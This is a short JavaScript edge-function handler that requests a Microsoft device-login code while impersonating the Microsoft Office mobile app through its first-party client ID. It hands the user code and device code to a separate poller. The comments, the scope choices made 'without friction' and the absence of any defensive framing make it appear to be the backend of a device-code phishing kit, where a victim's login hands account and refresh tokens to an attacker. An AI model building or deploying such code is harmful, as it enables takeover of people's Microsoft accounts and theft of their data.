export const config = { runtime: 'edge' };

export default async function handler(req) {
  // Triple-Verified First Party Office ID (Microsoft 365 Mobile)
  const CLIENT_ID = "d3590ed6-52b3-4102-a58d-7cc743a7f89f";

  try {
    /**
     * THE FIX: 
     * 1. Change from /common/ to /consumers/ to satisfy tenant-identifying requirements.
     * 2. Use a 'profile' focused scope set first to establish the handshake.
     */
    const response = await fetch("https://login.microsoftonline.com/consumers/oauth2/v2.0/devicecode", {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        client_id: CLIENT_ID,
        // Using basic scopes to ensure the first-party ID is accepted without friction
        scope: "openid profile offline_access User.Read" 
      }),
    });

    const data = await response.json();

    if (data.error) {
      console.error("Microsoft Debug:", data.error_description);
      return new Response(JSON.stringify(data), { status: 400, headers: {'Content-Type': 'application/json'} });
    }

    // Explicitly return the client_id so the poller continues to use the Office ID
    return new Response(JSON.stringify({ 
      user_code: data.user_code, 
      device_code: data.device_code,
      client_id: CLIENT_ID 
    }), {
      status: 200,
      headers: { 'Content-Type': 'application/json' }
    });

  } catch (err) {
    return new Response(JSON.stringify({ error: 'Connection Failed' }), { status: 502 });
  }
}
